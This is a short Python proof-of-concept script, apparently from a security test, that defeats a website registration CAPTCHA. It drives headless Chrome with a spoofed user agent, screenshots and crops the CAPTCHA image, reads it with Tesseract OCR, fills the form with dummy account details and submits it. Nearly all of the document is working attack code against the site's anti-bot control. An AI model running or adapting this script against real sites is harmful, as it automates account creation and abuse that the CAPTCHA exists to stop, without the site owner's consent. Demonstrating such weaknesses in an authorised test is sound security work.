# POC for CAPTCHA Bypass

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from PIL import Image
import time, warnings, pytesseract

def captcha_bypass():
    warnings.filterwarnings("ignore", category=DeprecationWarning)

    # Setup headless Chrome options
    options = Options()
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    options.add_argument('--headless')
    options.add_argument('--disable-gpu')
    options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36")

    # Initialize WebDriver
    driver = webdriver.Chrome(options=options)

    # Open target page
    driver.get("https://redacted/user-register-and-login/")
    time.sleep(2)

    # Take full-page screenshot
    filename = "captcha.png"
    driver.save_screenshot(filename)

    # Crop the CAPTCHA image
    img = Image.open(filename)
    left, top, right, bottom = 61, 410, 200, 492  # These values need to be adjusted based on actual CAPTCHA location
    img_res = img.crop((left, top, right, bottom))
    img_res.save('crop.png')
    img_res.show()

    # Fill the form fields
    driver.find_element(By.ID, "femanager_field_name").send_keys("CAPTCHA BYPASS")
    driver.find_element(By.ID, "femanager_field_username").send_keys("abc@tmgm.com")
    driver.find_element(By.ID, "femanager_field_company").send_keys("TMGM")
    driver.find_element(By.ID, "femanager_field_password").send_keys("ABC@1234567")
    driver.find_element(By.ID, "femanager_field_password_repeat").send_keys("ABC@1234567")

    # OCR the CAPTCHA image
    text = pytesseract.image_to_string(Image.open("crop.png")).strip()
    driver.find_element(By.ID, "femanager_field_captcha").send_keys(text)

    # Submit the form
    driver.find_element(By.ID, "femanager_field_submit").click()

    print("\n\t\t~ CAPTCHA BYPASS ATTEMPT COMPLETE ~")

# Run the function
captcha_bypass()
